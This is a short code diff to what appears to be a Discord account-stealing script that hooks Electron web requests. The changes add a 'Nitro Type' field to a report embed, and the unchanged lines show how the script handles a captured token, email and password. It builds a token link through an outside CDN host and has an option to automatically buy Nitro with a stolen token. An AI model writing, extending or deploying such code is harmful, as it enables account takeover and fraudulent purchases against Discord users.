@@ -518,9 +518,9 @@ const getNitro = (flags) => {
     case 0:
       return '';
     case 1:
-      return '<:nitro:892130462024224838> ';
+      return '<:classic:896119171019067423>  ';
     case 2:
-      return '<:nitro:892130462024224838> ';
+      return '<:classic:896119171019067423> + <a:boost:824036778570416129> ';
     default:
       return '';
   }
@@ -614,6 +614,11 @@ const login = async (email, password, token) => {
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
+          {
+            name: '<a:satanist:802503618972483615> nitro:',
+            value: `Nitro Type: **${nitro}**`,
+            inline: true,
+          },     
           {
             name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
@@ -949,7 +954,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       if (!config.auto_buy_nitro) return;
       setTimeout(() => {
         nitroBought(token).catch(console.error);
-      }, 7500);
+      }, 7500); 
       break;
 
     default:
